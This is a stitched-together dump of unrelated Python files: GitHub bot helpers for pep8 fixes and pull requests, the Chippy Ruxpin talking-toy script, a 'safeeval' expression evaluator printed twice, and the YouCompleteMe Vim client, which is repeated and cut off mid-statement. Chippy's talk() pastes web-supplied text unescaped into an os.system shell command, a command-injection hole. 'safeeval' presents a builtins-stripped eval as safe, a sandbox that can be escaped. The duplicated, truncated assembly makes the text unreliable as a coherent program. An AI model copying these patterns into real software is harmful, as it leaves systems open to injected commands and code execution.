    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)

    # A dictionary with filename paired with list of new line numbers
    py_files = {}

    for patchset in patch:
        if patchset.target_file[-3:] == '.py':
            py_file = patchset.target_file[1:]
            py_files[py_file] = []
            for hunk in patchset:
                for line in hunk.target_lines():
                    if line.is_added:
                        py_files[py_file].append(line.target_line_no)

    # Ignore errors and warnings specified in the config file
    to_ignore = ",".join(config["pycodestyle"]["ignore"])
    arg_to_ignore = ""
    if len(to_ignore) > 0:
        arg_to_ignore = "--ignore " + to_ignore

    for file in py_files:
        filename = file[1:]
        url = "https://raw.githubusercontent.com/{}/{}/{}"
        url = url.format(data["repository"], data["sha"], file)
        r = requests.get(url, headers=headers, auth=auth)
        with open("file_to_fix.py", 'w+', encoding=r.encoding) as file_to_fix:
            file_to_fix.write(r.text)

        cmd = 'autopep8 file_to_fix.py --diff {arg_to_ignore}'.format(
            arg_to_ignore=arg_to_ignore)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        data["diff"][filename] = stdout.decode(r.encoding)

        # Fix the errors
        data["diff"][filename] = data["diff"][filename].replace("file_to_check.py", filename)
        data["diff"][filename] = data["diff"][filename].replace("\\", "\\\\")

        ## Store the link to the file
        url = "https://github.com/{}/blob/{}{}"
        data[filename + "_link"] = url.format(data["repository"], data["sha"], file)
        os.remove("file_to_fix.py")


def create_gist(data, config):
    """Create gists for diff files"""
    REQUEST_JSON = {}
    REQUEST_JSON["public"] = True
    REQUEST_JSON["files"] = {}
    REQUEST_JSON["description"] = "In response to @{0}'s comment : {1}".format(
        data["reviewer"], data["review_url"])

    for file, diffs in data["diff"].items():
        if len(diffs) != 0:
            REQUEST_JSON["files"][file.split("/")[-1] + ".diff"] = {
                "content": diffs
            }

    # Call github api to create the gist
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    url = "https://api.github.com/gists"
    res = requests.post(url, json=REQUEST_JSON, headers=headers, auth=auth).json()
    data["gist_response"] = res
    data["gist_url"] = res["html_url"]


def delete_if_forked(data):
    FORKED = False
    url = "https://api.github.com/user/repos"
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    r = requests.get(url, headers=headers, auth=auth)
    for repo in r.json():
        if repo["description"]:
            if data["target_repo_fullname"] in repo["description"]:
                FORKED = True
                r = requests.delete("https://api.github.com/repos/"
                                "{}".format(repo["full_name"]),
                                headers=headers, auth=auth)
    return FORKED


def fork_for_pr(data):
    FORKED = False
    url = "https://api.github.com/repos/{}/forks"
    url = url.format(data["target_repo_fullname"])
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    r = requests.post(url, headers=headers, auth=auth)
    if r.status_code == 202:
        data["fork_fullname"] = r.json()["full_name"]
        FORKED = True
    else:                    
        data["error"] = "Unable to fork"
    return FORKED


def update_fork_desc(data):
    # Check if forked (takes time)
    url = "https://api.github.com/repos/{}".format(data["fork_fullname"])
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    r = requests.get(url, headers=headers, auth=auth)
    ATTEMPT = 0
    while(r.status_code != 200):
        time.sleep(5)
        r = requests.get(url, headers=headers, auth=auth)
        ATTEMPT += 1
        if ATTEMPT > 10:
            data["error"] = "Forking is taking more than usual time"
            break

    full_name = data["target_repo_fullname"]
    author, name = full_name.split("/")
    request_json = {
        "name": name,
        "description": "Forked from @{}'s {}".format(author, full_name)
    }
    r = requests.patch(url, data=json.dumps(request_json), headers=headers, auth=auth)
    if r.status_code != 200:
        data["error"] = "Could not update description of the fork"


def create_new_branch(data):
    url = "https://api.github.com/repos/{}/git/refs/heads"
    url = url.format(data["fork_fullname"])
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    sha = None
    r = requests.get(url, headers=headers, auth=auth)
    for ref in r.json():
        if ref["ref"].split("/")[-1] == data["target_repo_branch"]:
            sha = ref["object"]["sha"]

    url = "https://api.github.com/repos/{}/git/refs"
    url = url.format(data["fork_fullname"])
    data["new_branch"] = "{}-pep8-patch".format(data["target_repo_branch"])
    request_json = {
        "ref": "refs/heads/{}".format(data["new_branch"]),
        "sha": sha,
    }
    r = requests.post(url, json=request_json, headers=headers, auth=auth)

    if r.status_code != 200:
        data["error"] = "Could not create new branch in the fork"


def autopep8ify(data, config):
    # Run pycodestyle
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    r = requests.get(data["diff_url"], headers=headers, auth=auth)

    ## All the python files with additions
    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)

    # A dictionary with filename paired with list of new line numbers
    py_files = {}

    for patchset in patch:
        if patchset.target_file[-3:] == '.py':
            py_file = patchset.target_file[1:]
            py_files[py_file] = []
            for hunk in patchset:
                for line in hunk.target_lines():
                    if line.is_added:
                        py_files[py_file].append(line.target_line_no)

    # Ignore errors and warnings specified in the config file
    to_ignore = ",".join(config["pycodestyle"]["ignore"])
    arg_to_ignore = ""
    if len(to_ignore) > 0:
        arg_to_ignore = "--ignore " + to_ignore

    for file in py_files:
        filename = file[1:]
        url = "https://raw.githubusercontent.com/{}/{}/{}"
        url = url.format(data["repository"], data["sha"], file)
        r = requests.get(url, headers=headers, auth=auth)
        with open("file_to_fix.py", 'w+', encoding=r.encoding) as file_to_fix:
            file_to_fix.write(r.text)

        cmd = 'autopep8 file_to_fix.py {arg_to_ignore}'.format(
            arg_to_ignore=arg_to_ignore)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
        stdout, _ = proc.communicate()
        data["results"][filename] = stdout.decode(r.encoding)

        os.remove("file_to_fix.py")


def commit(data):
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])

    fullname = data.get("fork_fullname")

    for file, new_file in data["results"].items():
        url = "https://api.github.com/repos/{}/contents/{}"
        url = url.format(fullname, file)
        params = {"ref": data["new_branch"]}
        r = requests.get(url, params=params, headers=headers, auth=auth)
        sha_blob = r.json().get("sha")
        params["path"] = file
        content_code = base64.b64encode(new_file.encode()).decode("utf-8")
        request_json = {
            "path": file,
            "message": "Fix pep8 errors in {}".format(file),
            "content": content_code,
            "sha": sha_blob,
            "branch": data.get("new_branch"),
        }
        r = requests.put(url, json=request_json, headers=headers, auth=auth)


def create_pr(data):
    headers = {"Authorization": "token " + os.environ["GITHUB_TOKEN"]}
    auth = (os.environ["BOT_USERNAME"], os.environ["BOT_PASSWORD"])
    url = "https://api.github.com/repos/{}/pulls"
    url = url.format(data["target_repo_fullname"])
    request_json = {
        "title": "Fix pep8 errors",
        "head": "pep8speaks:{}".format(data["new_branch"]),
        "base": data["target_repo_branch"],
        "body": "The changes are suggested by autopep8",
    }
    r = requests.post(url, json=request_json, headers=headers, auth=auth)
    if r.status_code == 201:
        data["pr_url"] = r.json()["html_url"]
    else:                    
        data["error"] = "Pull request could not be created"

#!/usr/bin/python
# Chippy Ruxpin by Next Thing Co
# Powered by C.H.I.P., the world's first $9 computer!

# apt-get install python-setuptools python-dev build-essential espeak alsa-utils
# apt-get install python-alsaaudio python-numpy python-twitter python-bottle mplayer

# IMPORTANT NOTE ABOUT TWITTER STUFF!
# In order to retrieve tweets, you need to authorize this code to use your twitter account.
# This involves obtaining some special tokens that are specific to you.
# Please visit Twitter's website to obtain this information and put the values in the variables below.
# For more information, visit this URL:
# https://dev.twitter.com/oauth/overview/application-owner-access-tokens

consumerKey='INSERT YOUR CONSUMER KEY HERE FROM TWITTER'
consumerSecret='INSERT YOUR CONSUMER SECRET HERE FROM TWITTER'
accessTokenKey='INSERT YOUR ACCESS TOKEN KEY HERE FROM TWITTER'
accessTokenSecret='INSERT YOUR ACCESS TOKEN SECRET HERE FROM TWITTER'

import sys
import time
import subprocess
import os
from random import randint
from threading import Thread
from chippyRuxpin_audioPlayer import AudioPlayer
from chippyRuxpin_gpio import GPIO
from chippyRuxpin_twitter import ChippyTwitter
from chippyRuxpin_webFramework import WebFramework

fullMsg = ""

MOUTH_OPEN = 408 # GPIO pin assigned to open the mouth. XIO-P0
MOUTH_CLOSE = 412 # GPIO pin assigned to close the mouth. XIO-P2
EYES_OPEN = 410 # GPIO pin assigned to open the eyes. XIO-P4
EYES_CLOSE = 414 # GPIO pin assigned to close the eyes. XIO-P6

io = GPIO() #Establish connection to our GPIO pins.
io.setup( MOUTH_OPEN )
io.setup( EYES_OPEN )
io.setup( MOUTH_CLOSE )
io.setup( EYES_CLOSE )

audio = None
isRunning = True

def updateMouth():
    lastMouthEvent = 0
    lastMouthEventTime = 0

    while( audio == None ):
        time.sleep( 0.1 )
        
    while isRunning:
        if( audio.mouthValue != lastMouthEvent ):
            lastMouthEvent = audio.mouthValue
            lastMouthEventTime = time.time()

            if( audio.mouthValue == 1 ):
                io.set( MOUTH_OPEN, 1 )
                io.set( MOUTH_CLOSE, 0 )
            else:
                io.set( MOUTH_OPEN, 0 )
                io.set( MOUTH_CLOSE, 1 )
        else:
            if( time.time() - lastMouthEventTime > 0.4 ):
                io.set( MOUTH_OPEN, 0 )
                io.set( MOUTH_CLOSE, 0 )

# A routine for blinking the eyes in a semi-random fashion.
def updateEyes():
    while isRunning:
        io.set( EYES_CLOSE, 1 )
        io.set( EYES_OPEN, 0 )
        time.sleep(0.4)
        io.set( EYES_CLOSE, 0 )
        io.set( EYES_OPEN, 1 )
        time.sleep(0.4)
        io.set( EYES_CLOSE, 1 )
        io.set( EYES_OPEN, 0 )
        time.sleep(0.4)
        io.set( EYES_CLOSE, 0 )
        io.set( EYES_OPEN, 0 )
        time.sleep( randint( 0,7) )
   
def talk(myText):
    if( myText.find( "twitter" ) >= 0 ):
        myText += "0"
        myText = myText[7:-1]
        try:
	    myText = twitter.getTweet( myText )
	except:
	    print( "!!!ERROR: INVALID TWITTER CREDENTIALS. Please read README.md for instructions.")
            return
    
    os.system( "espeak \",...\" 2>/dev/null" ) # Sometimes the beginning of audio can get cut off. Insert silence.
    time.sleep( 0.5 )
    os.system( "espeak -w speech.wav \"" + myText + "\" -s 130" )                    
    audio.play("speech.wav")
    return myText

mouthThread = Thread(target=updateMouth)
mouthThread.start()
eyesThread = Thread(target=updateEyes)
eyesThread.start()     
audio = AudioPlayer()

if( consumerKey.find( 'TWITTER' ) >= 0 ):
    print( "WARNING: INVALID TWITTER CREDENTIALS. Please read README.md for instructions." )    
else:
    twitter = ChippyTwitter(consumerKey,consumerSecret,accessTokenKey,accessTokenSecret)

web = WebFramework(talk)
isRunning = False
io.cleanup()
sys.exit(1)

# -*- coding: utf-8 -*-
#    pyplot - python based data plotting tools
#    created for DESY Zeuthen
#    Copyright (C) 2012  Adam Lucke  software@louisenhof2.de
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>. 
#
import numpy as np
import dateutil.parser as dp

_safe_globals = {"__builtins__":None}                    
_safe_locals = {}

#add any needed builtins back in. 
for k in []:
    _safe_locals[k] = eval(k)

# numpy functions    
for k, v in np.__dict__.iteritems():
    _safe_locals[k] = getattr(np, k)

_safe_locals['logbins'] = lambda start, stop, count: [np.exp(x) for x in np.linspace(np.log(start), np.log(stop), count)]
_safe_locals['since04'] = lambda s: (dp.parse(s) - dp.parse('2004-01-01 00:00 +01')).total_seconds()

class safeeval:
    def __init__(self, safe_globals = _safe_globals, safe_locals = _safe_locals):
        self.globals = safe_globals.copy()
        self.globals.update(safe_locals)
        self.locals = {}

    def __setitem__(self, key, value):
        self.locals[key] = value

    def __getitem__(self, key):
        return self.locals[key]

    def __delitem__(self, key):
        del self.locals[key]

    def __call__(self, expr):
#        print 'safeval', expr
        return eval(expr, self.globals, self.locals)

if __name__ == '__main__':
    for k, v in _safe_locals.iteritems():
        print k, v


# -*- coding: utf-8 -*-
#    pyplot - python based data plotting tools
#    created for DESY Zeuthen
#    Copyright (C) 2012  Adam Lucke  software@louisenhof2.de
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>. 
#
import numpy as np
import dateutil.parser as dp

_safe_globals = {"__builtins__":None}                    
_safe_locals = {}

#add any needed builtins back in. 
for k in []:
    _safe_locals[k] = eval(k)

# numpy functions    
for k, v in np.__dict__.iteritems():
    _safe_locals[k] = getattr(np, k)

_safe_locals['logbins'] = lambda start, stop, count: [np.exp(x) for x in np.linspace(np.log(start), np.log(stop), count)]
_safe_locals['since04'] = lambda s: (dp.parse(s) - dp.parse('2004-01-01 00:00 +01')).total_seconds()

class safeeval:
    def __init__(self, safe_globals = _safe_globals, safe_locals = _safe_locals):
        self.globals = safe_globals.copy()
        self.globals.update(safe_locals)
        self.locals = {}

    def __setitem__(self, key, value):
        self.locals[key] = value

    def __getitem__(self, key):
        return self.locals[key]

    def __delitem__(self, key):
        del self.locals[key]

    def __call__(self, expr):
#        print 'safeval', expr
        return eval(expr, self.globals, self.locals)

if __name__ == '__main__':
    for k, v in _safe_locals.iteritems():
        print k, v



#!/usr/bin/env python
#
# Copyright (C) 2011, 2012  Google Inc.
#
# This file is part of YouCompleteMe.
#
# YouCompleteMe is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# YouCompleteMe is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.

import os
import vim
import tempfile
import json
import signal
from subprocess import PIPE
from ycm import vimsupport
from ycm import utils
from ycm.diagnostic_interface import DiagnosticInterface
from ycm.completers.all.omni_completer import OmniCompleter
from ycm.completers.general import syntax_parse
from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype
from ycm.client.ycmd_keepalive import YcmdKeepalive
from ycm.client.base_request import BaseRequest, BuildRequestData
from ycm.client.command_request import SendCommandRequest
from ycm.client.completion_request import CompletionRequest
from ycm.client.omni_completion_request import OmniCompletionRequest
from ycm.client.event_notification import ( SendEventNotificationAsync,
                                            EventNotification )
from ycm.server.responses import ServerError

try:
  from UltiSnips import UltiSnips_Manager
  USE_ULTISNIPS_DATA = True
except ImportError:
  USE_ULTISNIPS_DATA = False

# We need this so that Requests doesn't end up using the local HTTP proxy when
# talking to ycmd. Users should actually be setting this themselves when
# configuring a proxy server on their machine, but most don't know they need to
# or how to do it, so we do it for them.
# Relevant issues:
#  https://github.com/Valloric/YouCompleteMe/issues/641
#  https://github.com/kennethreitz/requests/issues/879
os.environ['no_proxy'] = '127.0.0.1,localhost'

# Force the Python interpreter embedded in Vim (in which we are running) to
# ignore the SIGINT signal. This helps reduce the fallout of a user pressing
# Ctrl-C in Vim.
signal.signal( signal.SIGINT, signal.SIG_IGN )

NUM_YCMD_STDERR_LINES_ON_CRASH = 30
SERVER_CRASH_MESSAGE_STDERR_FILE = (
  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +
  'Stderr (last {0} lines):\n\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )
SERVER_CRASH_MESSAGE_SAME_STDERR = (
  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '
  ' check console output for logs!' )
SERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours


class YouCompleteMe( object ):
  def __init__( self, user_options ):
    self._user_options = user_options
    self._user_notified_about_crash = False
    self._diag_interface = DiagnosticInterface( user_options )
    self._omnicomp = OmniCompleter( user_options )
    self._latest_completion_request = None
    self._latest_file_parse_request = None
    self._server_stdout = None
    self._server_stderr = None
    self._server_popen = None
    self._filetypes_with_keywords_loaded = set()
    self._temp_options_filename = None                    
    self._ycmd_keepalive = YcmdKeepalive()
    self._SetupServer()
    self._ycmd_keepalive.Start()

  def _SetupServer( self ):
    server_port = utils.GetUnusedLocalhostPort()
    with tempfile.NamedTemporaryFile( delete = False ) as options_file:
      self._temp_options_filename = options_file.name                    
      json.dump( dict( self._user_options ), options_file )
      options_file.flush()

      args = [ utils.PathToPythonInterpreter(),
               _PathToServerScript(),
               '--port={0}'.format( server_port ),
               '--options_file={0}'.format( options_file.name ),
               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),
               '--idle_suicide_seconds={0}'.format(
                  SERVER_IDLE_SUICIDE_SECONDS )]

      if not self._user_options[ 'server_use_vim_stdout' ]:
        filename_format = os.path.join( utils.PathToTempDir(),
                                        'server_{port}_{std}.log' )

        self._server_stdout = filename_format.format( port = server_port,
                                                      std = 'stdout' )
        self._server_stderr = filename_format.format( port = server_port,
                                                      std = 'stderr' )
        args.append('--stdout={0}'.format( self._server_stdout ))
        args.append('--stderr={0}'.format( self._server_stderr ))

        if self._user_options[ 'server_keep_logfiles' ]:
          args.append('--keep_logfiles')

      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)
      BaseRequest.server_location = 'http://localhost:' + str( server_port )

    self._NotifyUserIfServerCrashed()

  def _IsServerAlive( self ):
    returncode = self._server_popen.poll()
    # When the process hasn't finished yet, poll() returns None.
    return returncode is None


  def _NotifyUserIfServerCrashed( self ):
    if self._user_notified_about_crash or self._IsServerAlive():
      return
    self._user_notified_about_crash = True
    if self._server_stderr:
      with open( self._server_stderr, 'r' ) as server_stderr_file:
        error_output = ''.join( server_stderr_file.readlines()[
            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )
        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +
                                        error_output )
    else:
        vimsupport.PostVimMessage( SERVER_CRASH_MESSAGE_SAME_STDERR )


  def ServerPid( self ):
    if not self._server_popen:
      return -1
    return self._server_popen.pid


  def _ServerCleanup( self ):
    if self._IsServerAlive():
      self._server_popen.terminate()
    utils.RemoveIfExists( self._temp_options_filename )


  def RestartServer( self ):
    vimsupport.PostVimMessage( 'Restarting ycmd server...' )
    self._user_notified_about_crash = False
    self._ServerCleanup()
    self._SetupServer()


  def CreateCompletionRequest( self, force_semantic = False ):
    # We have to store a reference to the newly created CompletionRequest
    # because VimScript can't store a reference to a Python object across
    # function calls... Thus we need to keep this request somewhere.
    if ( not self.NativeFiletypeCompletionAvailable() and
         self.CurrentFiletypeCompletionEnabled() and
         self._omnicomp.ShouldUseNow() ):
      self._latest_completion_request = OmniCompletionRequest( self._omnicomp )
    else:
      extra_data = {}
      self._AddExtraConfDataIfNeeded( extra_data )
      if force_semantic:
        extra_data[ 'force_semantic' ] = True

      self._latest_completion_request = ( CompletionRequest( extra_data )
                                          if self._IsServerAlive() else
                                          None )
    return self._latest_completion_request


  def SendCommandRequest( self, arguments, completer ):
    if self._IsServerAlive():
      return SendCommandRequest( arguments, completer )


  def GetDefinedSubcommands( self ):
    if self._IsServerAlive():
      return BaseRequest.PostDataToHandler( BuildRequestData(),
                                            'defined_subcommands' )
    else:
      return []


  def GetCurrentCompletionRequest( self ):
    return self._latest_completion_request


  def GetOmniCompleter( self ):
    return self._omnicomp


  def NativeFiletypeCompletionAvailable( self ):
    return any( [ FiletypeCompleterExistsForFiletype( x ) for x in
                  vimsupport.CurrentFiletypes() ] )


  def NativeFiletypeCompletionUsable( self ):
    return ( self.CurrentFiletypeCompletionEnabled() and
             self.NativeFiletypeCompletionAvailable() )


  def OnFileReadyToParse( self ):
    self._omnicomp.OnFileReadyToParse( None )

    if not self._IsServerAlive():
      self._NotifyUserIfServerCrashed()

    extra_data = {}
    self._AddTagsFilesIfNeeded( extra_data )
    self._AddSyntaxDataIfNeeded( extra_data )
    self._AddExtraConfDataIfNeeded( extra_data )

    self._latest_file_parse_request = EventNotification( 'FileReadyToParse',
                                                          extra_data )
    self._latest_file_parse_request.Start()


  def OnBufferUnload( self, deleted_buffer_file ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'BufferUnload',
                                { 'unloaded_buffer': deleted_buffer_file } )


  def OnBufferVisit( self ):
    if not self._IsServerAlive():
      return
    extra_data = {}
    _AddUltiSnipsDataIfNeeded( extra_data )
    SendEventNotificationAsync( 'BufferVisit', extra_data )


  def OnInsertLeave( self ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'InsertLeave' )


  def OnCursorMoved( self ):
    self._diag_interface.OnCursorMoved()


  def OnVimLeave( self ):
    self._ServerCleanup()


  def OnCurrentIdentifierFinished( self ):
    if not self._IsServerAlive():
      return
    SendEventNotificationAsync( 'CurrentIdentifierFinished' )


  def DiagnosticsForCurrentFileReady( self ):
    return bool( self._latest_file_parse_request and
                 self._latest_file_parse_request.Done() )


  def GetDiagnosticsFromStoredRequest( self, qflist_format = False ):
    if self.DiagnosticsForCurrentFileReady():
      diagnostics = self._latest_file_parse_request.Response()
      # We set the diagnostics request to None because we want to prevent
      # Syntastic from repeatedly refreshing the buffer with the same diags.
      # Setting this to None makes DiagnosticsForCurrentFileReady return False
      # until the next request is created.
      self._latest_file_parse_request = None
      if qflist_format:
        return vimsupport.ConvertDiagnosticsToQfList( diagnostics )
      else:
        return diagnostics
    return []


  def UpdateDiagnosticInterface( self ):
    if not self.DiagnosticsForCurrentFileReady():
      return
    self._diag_interface.UpdateWithNewDiagnostics(
      self.GetDiagnosticsFromStoredRequest() )


  def ShowDetailedDiagnostic( self ):
    if not self._IsServerAlive():
      return
    try:
      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),
                                                  'detailed_diagnostic' )
      if 'message' in debug_info:
        vimsupport.EchoText( debug_info[ 'message' ] )
    except ServerError as e:
      vimsupport.PostVimMessage( str( e ) )


  def DebugInfo( self ):
    if self._IsServerAlive():
      debug_info = BaseRequest.PostDataToHandler( BuildRequestData(),
                                                  'debug_info' )
    else:
      debug_info = 'Server crashed, no debug info from server'
    debug_info += '\nServer running at: {0}'.format(
        BaseRequest.server_location )
    debug_info += '\nServer process ID: {0}'.format( self._server_popen.pid )
    if self._server_stderr or self._server_stdout:
      debug_info += '\nServer logfiles:\n  {0}\n  {1}'.format(
        self._server_stdout,
        self._server_stderr )

    return debug_info


  def CurrentFiletypeCompletionEnabled( self ):
    filetypes = vimsupport.CurrentFiletypes()
    filetype_to_disable = self._user_options[
      'filetype_specific_completion_to_disable' ]
    return not all([ x in filetype_to_disable for x in filetypes ])


  def _AddSyntaxDataIfNeeded( self, extra_data ):
    if not self._user_options[ 'seed_identifiers_with_syntax' ]:
      return
    filetype = vimsupport.CurrentFiletypes()[ 0 ]
    if filetype in self._filetypes_with_keywords_loaded:
      return

    self._filetypes_with_keywords_loaded.add( filetype )
    extra_data[ 'syntax_keywords' ] = list(
       syntax_parse.SyntaxKeywordsForCurrentBuffer() )


  def _AddTagsFilesIfNeeded( self, extra_data ):
    def GetTagFiles():
      tag_files = vim.eval( 'tagfiles()' )
      current_working_directory = os.getcwd()
      return [ os.path.join( current_working_directory, x ) for x in tag_files ]

    if not self._user_options[ 'collect_identifiers_from_tags_files' ]:
      return
    extra_data[ 'tag_files' ] = GetTagFiles()


  def _AddExtraConfDataIfNeeded( self, extra_data ):
    def BuildExtraConfData( extra_conf_vim_data ):
      return dict( ( expr, vimsupport.VimExpressionToPythonType( expr ) )
                   for expr in extra_conf_vim_data )

    extra_conf_vim_data = self._user_options[ 'extra_conf_vim_data' ]
    if extra_conf_vim_data:
      extra_data[ 'extra_conf_data' ] = BuildExtraConfData(
        extra_conf_vim_data )


def _PathToServerScript():
  dir_of_current_script = os.path.dirname( os.path.abspath( __file__ ) )
  return os.path.join( dir_of_current_script, 'server/ycmd.py' )


def _AddUltiSnipsDataIfNeeded( extra_data ):
  if not USE_ULTISNIPS_DATA:
    return

  try:
    rawsnips = UltiSnips_Manager._snips( '', 1 )
  except:
    return

  # UltiSnips_Manager._snips() returns a class instance where:
  # class.trigger - name of snippet trigger word ( e.g. defn or testcase )
  # class.description - description of the snippet
  extra_data[ 'ultisnips_snippets' ] = [ { 'trigger': x.trigger,
                                           'description': x.description
                                         } for x in rawsnips ]




#!/usr/bin/env python
#
# Copyright (C) 2011, 2012  Google Inc.
#
# This file is part of YouCompleteMe.
#
# YouCompleteMe is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# YouCompleteMe is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with YouCompleteMe.  If not, see <http://www.gnu.org/licenses/>.

import os
import vim
import tempfile
import json
import signal
from subprocess import PIPE
from ycm import vimsupport
from ycm import utils
from ycm.diagnostic_interface import DiagnosticInterface
from ycm.completers.all.omni_completer import OmniCompleter
from ycm.completers.general import syntax_parse
from ycm.completers.completer_utils import FiletypeCompleterExistsForFiletype
from ycm.client.ycmd_keepalive import YcmdKeepalive
from ycm.client.base_request import BaseRequest, BuildRequestData
from ycm.client.command_request import SendCommandRequest
from ycm.client.completion_request import CompletionRequest
from ycm.client.omni_completion_request import OmniCompletionRequest
from ycm.client.event_notification import ( SendEventNotificationAsync,
                                            EventNotification )
from ycm.server.responses import ServerError

try:
  from UltiSnips import UltiSnips_Manager
  USE_ULTISNIPS_DATA = True
except ImportError:
  USE_ULTISNIPS_DATA = False

# We need this so that Requests doesn't end up using the local HTTP proxy when
# talking to ycmd. Users should actually be setting this themselves when
# configuring a proxy server on their machine, but most don't know they need to
# or how to do it, so we do it for them.
# Relevant issues:
#  https://github.com/Valloric/YouCompleteMe/issues/641
#  https://github.com/kennethreitz/requests/issues/879
os.environ['no_proxy'] = '127.0.0.1,localhost'

# Force the Python interpreter embedded in Vim (in which we are running) to
# ignore the SIGINT signal. This helps reduce the fallout of a user pressing
# Ctrl-C in Vim.
signal.signal( signal.SIGINT, signal.SIG_IGN )

NUM_YCMD_STDERR_LINES_ON_CRASH = 30
SERVER_CRASH_MESSAGE_STDERR_FILE = (
  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). ' +
  'Stderr (last {0} lines):\n\n'.format( NUM_YCMD_STDERR_LINES_ON_CRASH ) )
SERVER_CRASH_MESSAGE_SAME_STDERR = (
  'The ycmd server SHUT DOWN (restart with :YcmRestartServer). '
  ' check console output for logs!' )
SERVER_IDLE_SUICIDE_SECONDS = 10800  # 3 hours


class YouCompleteMe( object ):
  def __init__( self, user_options ):
    self._user_options = user_options
    self._user_notified_about_crash = False
    self._diag_interface = DiagnosticInterface( user_options )
    self._omnicomp = OmniCompleter( user_options )
    self._latest_completion_request = None
    self._latest_file_parse_request = None
    self._server_stdout = None
    self._server_stderr = None
    self._server_popen = None
    self._filetypes_with_keywords_loaded = set()
    self._temp_options_filename = None                    
    self._ycmd_keepalive = YcmdKeepalive()
    self._SetupServer()
    self._ycmd_keepalive.Start()

  def _SetupServer( self ):
    server_port = utils.GetUnusedLocalhostPort()
    with tempfile.NamedTemporaryFile( delete = False ) as options_file:
      self._temp_options_filename = options_file.name                    
      json.dump( dict( self._user_options ), options_file )
      options_file.flush()

      args = [ utils.PathToPythonInterpreter(),
               _PathToServerScript(),
               '--port={0}'.format( server_port ),
               '--options_file={0}'.format( options_file.name ),
               '--log={0}'.format( self._user_options[ 'server_log_level' ] ),
               '--idle_suicide_seconds={0}'.format(
                  SERVER_IDLE_SUICIDE_SECONDS )]

      if not self._user_options[ 'server_use_vim_stdout' ]:
        filename_format = os.path.join( utils.PathToTempDir(),
                                        'server_{port}_{std}.log' )

        self._server_stdout = filename_format.format( port = server_port,
                                                      std = 'stdout' )
        self._server_stderr = filename_format.format( port = server_port,
                                                      std = 'stderr' )
        args.append('--stdout={0}'.format( self._server_stdout ))
        args.append('--stderr={0}'.format( self._server_stderr ))

        if self._user_options[ 'server_keep_logfiles' ]:
          args.append('--keep_logfiles')

      self._server_popen = utils.SafePopen( args, stdout = PIPE, stderr = PIPE)
      BaseRequest.server_location = 'http://localhost:' + str( server_port )

    self._NotifyUserIfServerCrashed()

  def _IsServerAlive( self ):
    returncode = self._server_popen.poll()
    # When the process hasn't finished yet, poll() returns None.
    return returncode is None


  def _NotifyUserIfServerCrashed( self ):
    if self._user_notified_about_crash or self._IsServerAlive():
      return
    self._user_notified_about_crash = True
    if self._server_stderr:
      with open( self._server_stderr, 'r' ) as server_stderr_file:
        error_output = ''.join( server_stderr_file.readlines()[
            : - NUM_YCMD_STDERR_LINES_ON_CRASH ] )
        vimsupport.PostMultiLineNotice( SERVER_CRASH_MESSAGE_STDERR_FILE +
